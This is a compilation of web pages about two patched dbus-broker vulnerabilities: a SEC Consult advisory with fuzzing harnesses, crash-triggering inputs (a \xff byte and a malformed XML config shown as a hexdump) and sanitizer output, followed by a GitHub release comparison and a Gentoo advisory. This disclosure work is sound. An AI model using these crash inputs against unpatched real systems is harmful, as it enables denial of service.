=== Content from sec-consult.com_c9020f2b_20250108_131222.html ===

Toggle Navbar

* [Career](/career/)
* [About us](/about-us/)
* [Contact](/contact/)

* EN
  + [DE](/de/vulnerability-lab/advisory/speicherkorruptions-schwachstellen-dbus-broker/ "German")
Search

* Security Testing
  + [Web Application Security](/security-testing/web-application-security/)
  + [Penetration Testing](/security-testing/penetration-testing/)
  + [Mobile Security](/security-testing/mobile-security/)
  + [Cloud Security](/security-testing/cloud-security/)
  + [IT Infrastructure Security](/security-testing/it-infrastructure-security/)
  + [Security for SAP Services](/security-testing/security-for-sap-services/)
  + [IoT and Embedded Systems Security](/security-testing/iot-and-embedded-systems-security/)
  + [Red Teaming](/security-testing/red-teaming/)
* Processes & Organisation
  + [Information Security Management (ISM)](/processes-organisation/information-security-management-ism/)
  + [Network and Information Systems Security (NIS)](/processes-organisation/network-and-information-systems-security-nis/)
  + [OT Security](/processes-organisation/ot-security/)
  + [Secure Software Development Consulting](/processes-organisation/secure-software-development/)
  + [Red Teaming](/security-testing/red-teaming/)
  + [SEC Trainings](/processes-organisation/sec-trainings/)
  + [Project- und Program Management](/processes-organisation/project-und-program-management/)
* Incident Response
  + [SEC Defence](/incident-response/sec-defence/)
* [Vulnerability Lab](/vulnerability-lab/)
* [Blog](/blog/)
 [Incident?
Breached?
Report an incident](/incident-response/sec-defence/)

1. [Home](/)
2. [Vulnerability Lab](/vulnerability-lab/)
3. Multiple Memory Corruption Vulnerabilities in dbus-broker
# Multiple Memory Corruption Vulnerabilities in dbus-broker

Title

Multiple Memory Corruption Vulnerabilities

Product

dbus-broker

Vulnerable Version

dbus-broker-29

Fixed Version

dbus-broker-31

CVE Number

CVE-2022-31212, CVE-2022-31213

Impact

medium

Homepage

[https://github.com/bus1/dbus-broker](https://github.com/bus1/dbus-broker "https://github.com/bus1/dbus-broker")

Found

14.01.2022

By

S. Robertz, G. Hechenberger, T. Weber, T. Longin (Office Vienna) | SEC Consult Vulnerability Lab

Multiple memory corruption vulnerabilities were identified in dbus-broker, the standard dbus implementation for Fedora-based systems. Supplying malformed service or config files will cause the dbus-broker to crash or to overread memory boundaries.

## Vendor description

*"The dbus-broker project is an implementation of a message bus as defined by the D-Bus specification. Its aim is to provide high performance and reliability, while keeping compatibility to the D-Bus reference implementation.It is exclusively written for Linux systems, and makes use of many modern features provided by recent linux kernel releases."*

Source: <https://github.com/bus1/dbus-broker>

## Business recommendation

The vendor provides a patch which should be installed immediately.

## Vulnerability overview/description

### 1) Stack-Buffer Over-Read (CVE-2022-31212)

Dbus-Broker depends on c-uitl/c-shquote to parse DBus service's Exec line. c-shquote contains a stack buffer over-read if a malicious Exec line is supplied.

### 2) Null Pointer Dereference (CVE-2022-31213)

Multiple Null Pointer references can be found when supplying a malformed XML config file.

## Proof of concept

### 1) Stack-Buffer Over-Read (CVE-2022-31212)

Following harness was used to fuzz the function **c\_shquote\_parse\_argv()** as it is used in **src/launch/launcher.c of dbus-broker.**

```
#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include "c-shquote.h"

#define SIZE_65KB 66560

int main(int argc, char** argv) {
  char fuzz_buf[SIZE_65KB] = "";
  ssize_t fuzz_len = read(STDIN_FILENO, fuzz_buf, SIZE_65KB);
  char **out_argv;
  ssize_t out_argc;
  c_shquote_parse_argv(&out_argv, &out_argc, fuzz_buf, strlen(fuzz_buf));
  return 0;
}
```

Passing \xff to the STDIN of the testharness will cause following crash:

```
==21744==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fff98c675bf at pc
0x558e29cacc02 bp 0x7fff98c67490 sp 0x7fff98c67488
READ of size 1 at 0x7fff98c675bf thread T0
#0 0x558e29cacc01 in c_shquote_strncspn c-shquote/src/c-shquote.c:119:21
#1 0x558e29caff15 in c_shquote_parse_next c-shquote/src/c-shquote.c:540:31
#2 0x558e29cb09c2 in c_shquote_parse_argv c-shquote/src/c-shquote.c:620:21
#3 0x558e29cab7e9 in c-shquote/src/argv_parser.c:23:2
#4 0x7f07953a8b24 in __libc_start_main (/usr/lib/libc.so.6+0x27b24)
#5 0x558e29bca15d in _start (c-shquote/src/harness_argv_parser+0x2015d)
Address 0x7fff98c675bf is located in stack of thread T0 at offset 287 in frame
#0 0x558e29cac54f in c_shquote_strncspn c-shquote/src/c-shquote.c:102
This frame has 1 object(s):
[32, 287) 'buffer' (line 103) <== Memory access at offset 287 overflows this variable
HINT: this may be a false positive if your program uses some custom stack unwind mechanism,
swapcontext or vfork
(longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow c-shquote/src/c-shquote.c:119:21 in
c_shquote_strncspn
Shadow bytes around the buggy address:
0x100073184e60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x100073184e70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x100073184e80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x100073184e90: 00 00 00 00 f1 f1 f1 f1 00 00 00 00 00 00 00 00
0x100073184ea0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x100073184eb0: 00 00 00 00 00 00 00[07]f3 f3 f3 f3 f3 f3 f3 f3
0x100073184ec0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x100073184ed0: 00 00 00 00 f1 f1 f1 f1 00 f2 f2 f2 00 f2 f2 f2
0x100073184ee0: 00 f2 f2 f2 00 f3 f3 f3 00 00 00 00 00 00 00 00
0x100073184ef0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x100073184f00: 00 00 00 00 00 00 00 00 f1 f1 f1 f1 00 f2 f2 f2
Shadow byte legend (one shadow byte represents 8 application bytes):
Addressable: 00
Partially addressable: 01 02 03 04 05 06 07
Heap left redzone: fa
Freed heap region: fd
Stack left redzone: f1
Stack mid redzone: f2
Stack right redzone:f3
Stack after return:  f5
Stack use after scope: f8
Global redzone: f9
Global init order: f6
Poisoned by user: f7
Container overflow: fc
Array cookie: ac
Intra object redzone: bb
ASan internal: fe
Left alloca redzone: ca
Right alloca redzone: cb
==21744==ABORTING
```

The error occurs in the functions  **c\_shquote\_strnspn() and c\_shquote\_strncspn().**

Both allocate a buffer like this:

```
bool buffer[UCHAR_MAX] = {};
```

UCHAR\_MAX is defined in the C standard header limits.h and equals 255. Thus, array indexes of 0-254 can be addressed.

However, the buffer will then be accessed like this:

**buffer[(unsigned char)string[i]],** where string is the commandline from STDIN (or the EXEC line in case of dbus-broker services).

Passing **\xff** will thus read an out of bounds array element.

### 2) Null Pointer Dereference (CVE-2022-31213)

The dbus-broker config parser uses the expat library to parse XML files.

**<limit name="max\_pendingonment"/>** is a valid XML line. Thus expat will parse it correctly. As no value is supplied in the statement, the limit\_max\_pendingonment parameter will contain a Null pointer. DBus-broker does not validate the result and tries to dereference the field, causing a crash. Multiple other XML edge case can be found that cause the expat library to correctly return a Null pointer, but are not handled correctly by the dbus-broker.

Including **<limit name="max\_pendingonment"/>**  causes following error message:

```
Program received signal SIGSEGV, Segmentation fault.
0x00007ffff782474a in ____strtoull_l_internal () from /lib64/libc.so.6
Missing separate debuginfos, use: yum debuginfo-install expat-2.2.5-4.el8.x86_64 libblkid-
2.32.1-28.el8.x86_64 libcap-2.26-5.el8.x86_64 libgcc-8.5.0-4.el8_5.x86_64 libmount-2.32.1-
28.el8.x86_64 libselinux-2.9-5.el8.x86_64 libuuid-2.32.1-28.el8.x86_64 pcre2-10.32-
2.el8.x86_64 sssd-client-2.5.2-2.el8_5.1.x86_64 systemd-libs-239-51.el8.x86_64
(gdb) bt
#0 0x00007ffff782474a in ____strtoull_l_internal () from /lib64/libc.so.6
#1 0x000000000040cf0a in util_strtou64 (valp=valp@entry=0x828bc8, string=0x0) at
../src/util/string.c:42
#2 0x0000000000408f07 in config_parser_end_fn (userdata=0x7fffffffdf58, name=0x82278c
"limit") at ../src/launch/config.c:1140
#3 0x00007ffff7ba100f in doContent () from /lib64/libexpat.so.1
#4 0x00007ffff7ba20c0 in contentProcessor () from /lib64/libexpat.so.1
#5 0x00007ffff7ba480c in XML_ParseBuffer () from /lib64/libexpat.so.1
#6 0x000000000040425f in config_parser_include (parser=0x7fffffffdf50, root=0x0,
node=<optimized out>, nss_cache=0x7fffffffdf30, dirwatch=0x8192a0) at
../src/launch/config.c:1289
#7 config_parser_read (parser=parser@entry=0x7fffffffdf50, rootp=rootp@entry=0x7fffffffdf28,
path=<optimized out>, nss_cache=nss_cache@entry=0x7fffffffdf30, dirwatch=0x8192a0) at
../src/launch/config.c:1347
#8 0x0000000000402c02 in main (argc=<optimized out>, argv=0x7fffffffe098) at
../src/launch/harness-config.c:24
```

Following harness was used:

```
#include <c-list.h>
#include <c-stdaux.h>
#include <stdlib.h>
#include "launch/config.h"
#include "launch/nss-cache.h"
#include "util/dirwatch.h"

int main(int argc, char **argv) {
_c_cleanup_(config_parser_deinit) ConfigParser parser = CONFIG_PARSER_NULL(parser);
_c_cleanup_(config_root_freep) ConfigRoot *rootp = NULL;
_c_cleanup_(nss_cache_deinit) NSSCache nss_cache = NSS_CACHE_INIT;
_c_cleanup_(dirwatch_freep) Dirwatch *dirwatch = NULL;
int r;
r = dirwatch_new(&dirwatch);
config_parser_init(&parser);
r = config_parser_read(&parser, &rootp, argv[1], &nss_cache, dirwatch);
return 0;
}
```

Following config file will cause another error:

```
00000000: 3c21 2d2d 202d 2d3e 0a0a 3c21 444f 4354  <!-- -->..<!DOCT
00000010: 5950 4520 6720 5055 424c 4943 2022 2d2f  YPE g PUBLIC "-/
00000020: 4e22 0a20 2268 7474 223e 0a3c 6275 7363  N". "htt">.<busc
00000030: 6f6e 6669 673e 0a0a 203c 7479 7065 3e73  onfig>.. <type>s
00000040: 643c 2f74 7970 653e 3c66 6f72 6b2f 3e0a  d</type><fork/>.
00000050: 203c 7374 616e 6461 7264 5f73 7973 e803   <standard_sys..
00000060: 6d5f 7365 7276 6963 6564 6972 732f 3e0a  m_servicedirs/>.
00000070: 203c 7365 7276 6963 6564 6972 2072 6563   <servicedir rec
00000080: 6569 7665 5f74 7970 653d 2265 7272 6f72  eive_type="error
00000090: 222f 3e0a 3c61 6c6c 6f77 2072 6563 6569  "/>.<allow recei
000000a0: 7665 5f74 7970 653d 2273 6967 6e61 6c22  ve_type="signal"
000000b0: 2f3e 2d3e 203c 616c 6c6f 7720 7365 6e64  />-> <allow send
000000c0: 5f64 6573 7469 6e61 7469 6f6e 3d22 220a  _destination="".
000000d0: 2020 2073 656e 645f 696e 7465 7266 6163     send_interfac
000000e0: 653d 2222 202f 3e0a 3c61 6c6c 6f77 2073  e="" />.<allow s
000000f0: 656e 645f 6465 7374 696e 617d 696f 6e3d  end_destina}ion=
00000100: 2222 0a20 2020 7365 6e64 5f69 6e74 6572  "".   send_inter
00000110: 6661 6365 3d22 6f72 6522 2f3e 203c 212d  face="ore"/> <!-
00000120: 2d20 2d2d 3e20 3c64 656e 7920 7365 6e64  - --> <deny send
00000130: 5f64 6573 74                             _dest
```

The error is following:

```
id:000047,sig:11,src:000356+000302,time:4820049,execs:17106488,op:splice,rep:4
Unknown element in /fuzzing_Data/dbus-broker-config/out/harness-config2--
/crashes/id:000047,sig:11,src:000356+000302,time:4820049,execs:17106488,op:splice,rep:4 +8:
standard_sysm_servicedirs
Unknown attribute in /fuzzing_Data/dbus-broker-config/out/harness-config2--
/crashes/id:000047,sig:11,src:000356+000302,time:4820049,execs:17106488,op:splice,rep:4 +9:
receive_type="error"
Program received signal SIGSEGV, Segmentation fault.
0x00007ffff789dc95 in __strlen_avx2 () from /lib64/libc.so.6
#0 0x00007ffff789dc95 in __strlen_avx2 () from /lib64/libc.so.6
#1 0x00007ffff78714e2 in strdup () from /lib64/libc.so.6
#2 0x0000000000408e96 in config_parser_end_fn (userdata=0x7fffffffdf48, name=0x81b45c
"servicedir") at ../src/launch/config.c:1130
#3 0x00007ffff7ba100f in doContent () from /lib64/libexpat.so.1
#4 0x00007ffff7ba20c0 in contentProcessor () from /lib64/libexpat.so.1
#5 0x00007ffff7b9fb6b in doProlog () from /lib64/libexpat.so.1
#6 0x00007ffff7ba0a5f in prologProcessor () from /lib64/libexpat.so.1
#7 0x00007ffff7ba480c in XML_ParseBuffer () from /lib64/libexpat.so.1
#8 0x000000000040425f in config_parser_include (parser=0x7fffffffdf40, root=0x0,
node=<optimized out>, nss_cache=0x7fffffffdf20, dirwatch=0x8192a0) at
../src/launch/config.c:1289
#9 config_parser_read (parser=parser@entry=0x7fffffffdf40, rootp=rootp@entry=0x7fffffffdf18,
path=<optimized out>, nss_cache=nss_cache@entry=0x7fffffffdf20, dirwatch=0x8192a0) at
../src/launch/config.c:1347
#10 0x0000000000402c02 in main (argc=<optimized out>, argv=0x7fffffffe088) at
../src/launch/harness-config.c:24
```
## Vulnerable / tested versions

The Git Master branch (dbus-broker-29) has been tested and found to be vulnerable (tested at commit 727bee57cd3e3b5806eb8599abbdd49984b75732).

Furthermore, it also contains the vulnerable c-shquote library (tested at commit 83ccc2893385fcca1424b188f0f6c45a62f2b38d).

## Vendor contact timeline

| 2022-04-01 | Contacting vendor email. |
| --- | --- |
| 2022-04-04 | Sending advisory via unencrypted email. |
| 2022-04-19 | Bugs are fixed. New version will be released 2022-04-20. |
| 2022-05-10 | dbus-broker-30 released. |
| 2022-05-16 | dbus-broker-31 released with further fixes. |
| 2022-06-02 | Release of security advisory. |

## Solution

Update to the latest version. The vendor provides an updated version v30. v31 is available now which should be used as other introduced bugs have been fixed there:

<https://github.com/bus1/dbus-broker/releases/tag/v31>

### Workaround

None

### Advisory URL

<https://sec-consult.com/vulnerability-lab/>

EOF S. Robertz, G. Hechenberger, T. Weber, T. Longin / @2022

*Interested to work with the experts of SEC Consult?*

*Send us your [application](https://sec-consult.com/career/)*

*Interested in improving your cyber security with the experts of SEC Consult?*

*Contact our [local offices](https://sec-consult.com/contact/)*

[Back](/vulnerability-lab/)

* [Legal Notice](/legalnotice/)
* [Privacy Statement](/privacy-statement/)
* [Jobs](/career/)

SEC Consult is one of the leading consultancies in the field of cyber and [application security](/security-testing/web-application-security/ "Web Application Security"). The company specializes in [information security management](/processes-organisation/information-security-management-ism/ "Information Security Management (ISM)"), [NIS security audits](/processes-organisation/network-and-information-systems-security-nis/ "NIS security audits"), [penetration testing](/security-testing/penetration-testing/ "Pentesting (Pentest)"), ISO 27001 certification support, [Cyber Defence](/incident-response/sec-defence/ "Cyber Defence") and [secure software certification](/processes-organisation/secure-software-development/ "Secure Software Development Consulting"). SEC Consult is part of [Eviden](https://eviden.com/ "Link to Eviden website").

[![bsi ISO/IEC 27001 Information Security Management CERTIFIED](/typo3temp/assets/_processed_/c/2/csm_bsi_9a24e74563.png)](/about-us/ "About us")[![ISO 27001 CREST certified](/typo3temp/assets/_processed_/0/6/csm_crest_0eb9c5864d.png)](/about-us/ "About us")[![Great Place To Work AT certified](/typo3temp/assets/_processed_/0/3/csm_great-place-to-work-at_773b265aa6.png)](/about-us/ "About us")[![Great Place To Work DE certified](/typo3temp/assets/_processed_/d/6/csm_great-place-to-work-de_2fcb537270.png)](/about-us/ "About us")

## We use Cookies

We use cookies to offer you a perfect visit experience. These include cookies that are necessary for the operation of the site and for the control of our commercial corporate goals, as well as those that are only used for anonymous statistical purposes, for convenience settings or to display personalized content. Decide for yourself which categories you want to allow. Please note that based on your settings, not all functions of the site may be available.

**[Legal Notice](/legalnotice/)** •  **[Privacy Statement](/privacy-statement/)**

### Technically required

(
0
Service
)

no

Technically required (
0
Service
)

yes

### Analysis / statistics

(
1
Service
)

Anonymous evaluation for troubleshooting and further development

no

Analysis / statistics (
1
Service
)

yes

#### Matomo

no

Matomo

yes

Matomo.org
Show details

Hide details

**Purpose**: Error analysis, statistical evaluation of our website accesses, campaign analysis, conversion tracking.
 **Processing operations**: collection of access data, data from your browser and data about the content accessed; execution of analysis software and storage of data on your terminal device, anonymization of the data collected; evaluation of the anonymous data in the form of statistics.
 **Storage period**: 1 year.
 **Joint controller**: LimeSoda Interactive Marketing GmbH.
 **Legal basis for data processing**: Art. 6 para. 1 lit. f of the DSGVO.
 **Consequences of non-consent**: This basic tracking is absolutely necessary for the operation of our website.
 **Data transfer**: The data collected with Matomo is stored on our own servers. It is not passed on to third parties.

Accept selected

Reject all

Accept all



=== Content from github.com_25f73b8f_20250108_131217.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fbus1%2Fdbus-broker%2Fcompare%2Fv30...v31)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fbus1%2Fdbus-broker%2Fcompare%2Fv30...v31)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fcompare%2Fshow&source=header-repo&source_repo=bus1%2Fdbus-broker)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[bus1](/bus1)
/
**[dbus-broker](/bus1/dbus-broker)**
Public

* [Notifications](/login?return_to=%2Fbus1%2Fdbus-broker) You must be signed in to change notification settings
* [Fork
  84](/login?return_to=%2Fbus1%2Fdbus-broker)
* [Star
   692](/login?return_to=%2Fbus1%2Fdbus-broker)

* [Code](/bus1/dbus-broker)
* [Issues
  25](/bus1/dbus-broker/issues)
* [Pull requests
  11](/bus1/dbus-broker/pulls)
* [Actions](/bus1/dbus-broker/actions)
* [Projects
  0](/bus1/dbus-broker/projects)
* [Wiki](/bus1/dbus-broker/wiki)
* [Security](/bus1/dbus-broker/security)
* [Insights](/bus1/dbus-broker/pulse)

Additional navigation options

* [Code](/bus1/dbus-broker)
* [Issues](/bus1/dbus-broker/issues)
* [Pull requests](/bus1/dbus-broker/pulls)
* [Actions](/bus1/dbus-broker/actions)
* [Projects](/bus1/dbus-broker/projects)
* [Wiki](/bus1/dbus-broker/wiki)
* [Security](/bus1/dbus-broker/security)
* [Insights](/bus1/dbus-broker/pulse)

[Permalink](https://github.com/bus1/dbus-broker/compare/bus1%3Acf3b49c...bus1%3A4944daf)
# Comparing changes

 Choose two branches to see what’s changed or to start a new pull request.
If you need to, you can also  compare across forks
 or
[learn more about diff comparisons](https://docs.github.com/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/about-comparing-branches-in-pull-requests#three-dot-and-two-dot-git-diff-comparisons).

# Open a pull request

 Create a new pull request by comparing changes across two branches. If you need to, you can also  compare across forks
.
[Learn more about diff comparisons here](https://docs.github.com/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/about-comparing-branches-in-pull-requests#three-dot-and-two-dot-git-diff-comparisons).

*base repository:*
bus1/dbus-broker

Failed to load repositories. Confirm that selected base ref is valid, then try again.

 Loading

*base:*
v30

Choose a base ref

Branches
Tags

Could not load branches

Nothing to show

 Loading

[{{ refName }}
default](/bus1/dbus-broker/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...v31)

Could not load tags

Nothing to show

[{{ refName }}
default](/bus1/dbus-broker/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...v31)

 Loading

...

*head repository:*
bus1/dbus-broker

Failed to load repositories. Confirm that selected head ref is valid, then try again.

 Loading

*compare:*
v31

Choose a head ref

Branches
Tags

Could not load branches

Nothing to show

 Loading

[{{ refName }}
default](/bus1/dbus-broker/compare/v30...%7B%7B%20urlEncodedRefName%20%7D%7D)

Could not load tags

Nothing to show

[{{ refName }}
default](/bus1/dbus-broker/compare/v30...%7B%7B%20urlEncodedRefName%20%7D%7D)

 Loading

* 4

  commits
* 21

  files changed
* 1

  contributor

### Commits on May 11, 2022

1. [util/user: keep reference to user in each usage table](/bus1/dbus-broker/commit/608b259e25ef1348b9e4a8e022c35b5c68d3df98)
    …

   ```
   Keep a reference to an owning user in each usage table. We want to allow
   callers to hold charges without holding on to any user references.

   Also fix the peer-deinitialization to be ordered correctly and free the
   user references last (in particular, after the charges). This is not
   strictly necessary, but now follows our coding style and would have
   avoided possible failures.

   This fixes an assertion failure when disconnecting entire groups of
   peers of the same user, due to the recent fix that actually made
   peer-accounting do something.

   Reported-by: Torge Matthies
   Reported-by: Mel34
   Signed-off-by: David Rheinsberg <david.rheinsberg@gmail.com>
   ```

   [![@dvdhrm](https://avatars.githubusercontent.com/u/623857?s=40&v=4)](/dvdhrm)

   [dvdhrm](/bus1/dbus-broker/commits?author=dvdhrm "View all commits by dvdhrm")
   committed
   May 11, 2022

   Configuration menu

   * [View commit details](/bus1/dbus-broker/commit/608b259e25ef1348b9e4a8e022c35b5c68d3df98)
   * Copy full SHA for 608b259
   * [Browse repository at this point](/bus1/dbus-broker/tree/608b259e25ef1348b9e4a8e022c35b5c68d3df98)

   Copy the full SHA

    [608b259](/bus1/dbus-broker/commit/608b259e25ef1348b9e4a8e022c35b5c68d3df98)View commit details

   Browse the repository at this point in the history

### Commits on May 12, 2022

1. [launch/service: fix release of argv array](/bus1/dbus-broker/commit/6d9b817b7c165be9addbc28b9e84d7ed1697d11a)
    …

   ```
   While service_free() correctly releases the strv in `argv`, the
   service_update() path does not. It frees `argv`, but not the individual
   entries. Fix this and properly release all entries.

   Reported-by: Evgeny Vereshchagin
   Signed-off-by: David Rheinsberg <david.rheinsberg@gmail.com>
   ```

   [![@dvdhrm](https://avatars.githubusercontent.com/u/623857?s=40&v=4)](/dvdhrm)

   [dvdhrm](/bus1/dbus-broker/commits?author=dvdhrm "View all commits by dvdhrm")
   committed
   May 12, 2022

   Configuration menu

   * [View commit details](/bus1/dbus-broker/commit/6d9b817b7c165be9addbc28b9e84d7ed1697d11a)
   * Copy full SHA for 6d9b817
   * [Browse repository at this point](/bus1/dbus-broker/tree/6d9b817b7c165be9addbc28b9e84d7ed1697d11a)

   Copy the full SHA

    [6d9b817](/bus1/dbus-broker/commit/6d9b817b7c165be9addbc28b9e84d7ed1697d11a)View commit details

   Browse the repository at this point in the history
2. [global: use c\_mem\*() over mem\*()](/bus1/dbus-broker/commit/701759a08f5982f515308c269a8e224fc433f4af)
    …

   ```
   Use the new c_mem*() functions rather than mem*() so we protect against
   NULL pointers in empty areas, which are UB with the classic mem*()
   functions.

   Signed-off-by: David Rheinsberg <david.rheinsberg@gmail.com>
   ```

   [![@dvdhrm](https://avatars.githubusercontent.com/u/623857?s=40&v=4)](/dvdhrm)

   [dvdhrm](/bus1/dbus-broker/commits?author=dvdhrm "View all commits by dvdhrm")
   committed
   May 12, 2022

   Configuration menu

   * [View commit details](/bus1/dbus-broker/commit/701759a08f5982f515308c269a8e224fc433f4af)
   * Copy full SHA for 701759a
   * [Browse repository at this point](/bus1/dbus-broker/tree/701759a08f5982f515308c269a8e224fc433f4af)

   Copy the full SHA

    [701759a](/bus1/dbus-broker/commit/701759a08f5982f515308c269a8e224fc433f4af)View commit details

   Browse the repository at this point in the history

### Commits on May 16, 2022

1. [build: prepare bugfix-release v31](/bus1/dbus-broker/commit/4944daf06275aaccd2fcdbfea994c3cb7cec65d2)
    …

   ```
   Fill in NEWS, update AUTHORS, and bump version to 31.

   Signed-off-by: David Rheinsberg <david.rheinsberg@gmail.com>
   ```

   [![@dvdhrm](https://avatars.githubusercontent.com/u/623857?s=40&v=4)](/dvdhrm)

   [dvdhrm](/bus1/dbus-broker/commits?author=dvdhrm "View all commits by dvdhrm")
   committed
   May 16, 2022

   Configuration menu

   * [View commit details](/bus1/dbus-broker/commit/4944daf06275aaccd2fcdbfea994c3cb7cec65d2)
   * Copy full SHA for 4944daf
   * [Browse repository at this point](/bus1/dbus-broker/tree/4944daf06275aaccd2fcdbfea994c3cb7cec65d2)

   Copy the full SHA

    [4944daf](/bus1/dbus-broker/commit/4944daf06275aaccd2fcdbfea994c3cb7cec65d2)View commit details

   Browse the repository at this point in the history

 Loading

### This comparison is taking too long to generate.

Unfortunately it looks like we can’t render this comparison for you right now. It might be too big, or there might be something weird with your repository.

You can try running this command locally to see the comparison on your machine:

`git diff v30...v31`

  Retry

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from security.gentoo.org_58c21ece_20250108_131223.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# dbus-broker: Multiple Vulnerabilities — GLSA **202305-04**

Multiple vulnerabilities have been found in dbus-broker, the worst of which could result in denial of service.

### Affected packages

| Package | **sys-apps/dbus-broker** on all architectures |
| --- | --- |
| Affected versions | < **31** |
| Unaffected versions | >= **31** |

### Background

dbus-broker is a Linux D-Bus message broker.

### Description

Multiple vulnerabilities have been discovered in dbus-broker. Please review the CVE identifiers referenced below for details.

### Impact

Please review the referenced CVE identifiers for details.

### Workaround

There is no known workaround at this time.

### Resolution

All dbus-broker users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=sys-apps/dbus-broker-31"

```
### References

* [CVE-2022-31212](https://nvd.nist.gov/vuln/detail/CVE-2022-31212)
* [CVE-2022-31213](https://nvd.nist.gov/vuln/detail/CVE-2022-31213)

**Release date**

May 03, 2023

**Latest revision**

May 03, 2023: 1

**Severity**

low

**Exploitable**

remote

**Bugzilla entries**

* [851696](https://bugs.gentoo.org/show_bug.cgi?id=851696)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**


